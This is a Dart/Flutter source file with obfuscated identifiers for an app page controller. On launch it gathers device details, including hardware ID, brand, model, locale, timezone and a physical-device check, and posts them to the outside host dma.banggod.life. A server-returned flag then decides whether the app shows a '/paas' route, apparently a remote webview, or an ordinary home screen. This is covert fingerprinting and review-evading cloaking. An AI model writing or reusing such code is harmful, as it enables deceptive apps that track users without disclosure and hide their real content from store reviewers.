import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var debykxqsf = RxBool(false);
  var qpudwzjhes = RxBool(true);
  var kvyfj = RxString("");
  var rossie = RxBool(false);
  var davis = RxBool(true);
  final jamzflbph = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    tdpkfm();
  }


  Future<void> tdpkfm() async {

    rossie.value = true;
    davis.value = true;
    qpudwzjhes.value = false;

    jamzflbph.post("https://dma.banggod.life/RKCCkiSIaae",data: await umjwodyi()).then((value) {
      var xayf = value.data["xayf"] as String;
      var zwlmr = value.data["zwlmr"] as bool;
      if (zwlmr) {
        kvyfj.value = xayf;
        clara();
      } else {
        runte();
      }
    }).catchError((e) {
      qpudwzjhes.value = true;
      davis.value = true;
      rossie.value = false;
    });
  }

  Future<Map<String, dynamic>> umjwodyi() async {
    final DeviceInfoPlugin mbavch = DeviceInfoPlugin();
    PackageInfo nybvsrq_fkhq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var omfu = Platform.localeName;
    var qKdkPA = currentTimeZone;

    var JmVgY = nybvsrq_fkhq.packageName;
    var LjdQJR = nybvsrq_fkhq.version;
    var BEGjvYu = nybvsrq_fkhq.buildNumber;

    var rKbZdAjg = nybvsrq_fkhq.appName;
    var keatonStoltenberg = "";
    var HIyBRlAr  = "";
    var derrickStanton = "";
    var kDPhVQsM = "";
    var janyEmard = "";
    var BCubMNfo = "";
    var cindyBrown = "";
    var lornaHeaney = "";


    var mdWGQnh = "";
    var vSRWiJNM = false;

    if (GetPlatform.isAndroid) {
      mdWGQnh = "android";
      var bhatmenk = await mbavch.androidInfo;

      kDPhVQsM = bhatmenk.brand;

      BCubMNfo  = bhatmenk.model;
      HIyBRlAr = bhatmenk.id;

      vSRWiJNM = bhatmenk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      mdWGQnh = "ios";
      var mkciub = await mbavch.iosInfo;
      kDPhVQsM = mkciub.name;
      BCubMNfo = mkciub.model;

      HIyBRlAr = mkciub.identifierForVendor ?? "";
      vSRWiJNM  = mkciub.isPhysicalDevice;
    }
    var res = {
      "rKbZdAjg": rKbZdAjg,
      "LjdQJR": LjdQJR,
      "JmVgY": JmVgY,
      "janyEmard" : janyEmard,
      "BCubMNfo": BCubMNfo,
      "keatonStoltenberg" : keatonStoltenberg,
      "kDPhVQsM": kDPhVQsM,
      "HIyBRlAr": HIyBRlAr,
      "omfu": omfu,
      "BEGjvYu": BEGjvYu,
      "mdWGQnh": mdWGQnh,
      "qKdkPA": qKdkPA,
      "vSRWiJNM": vSRWiJNM,
      "derrickStanton" : derrickStanton,
      "lornaHeaney" : lornaHeaney,
      "cindyBrown" : cindyBrown,

    };
    return res;
  }

  Future<void> runte() async {
    Get.offAllNamed("/home");
  }

  Future<void> clara() async {
    Get.offAllNamed("/paas");
  }
}
